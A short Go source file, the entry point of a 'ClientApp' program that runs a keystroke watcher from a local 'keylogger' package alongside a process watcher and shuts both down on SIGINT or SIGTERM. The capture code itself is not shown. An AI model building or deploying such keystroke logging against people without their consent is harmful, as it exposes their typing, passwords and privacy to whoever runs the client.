package main

import (
	"ClientApp/keylogger"
	"ClientApp/openprograms"
	"fmt"
	"os"
	"os/signal"
	"syscall"
)

func main() {
	signalChannel := make(chan os.Signal, 1)
	signal.Notify(signalChannel, syscall.SIGINT, syscall.SIGTERM)

	exitChannel := make(chan bool, 1)

	go func() {
		sig := <-signalChannel
		fmt.Printf("Received signal: %v\n", sig)
		openprograms.RunProcessWatch(true)
		exitChannel <- true
	}()

	go openprograms.RunProcessWatch(false)

	keylogger.RunKeywatch(exitChannel)
}
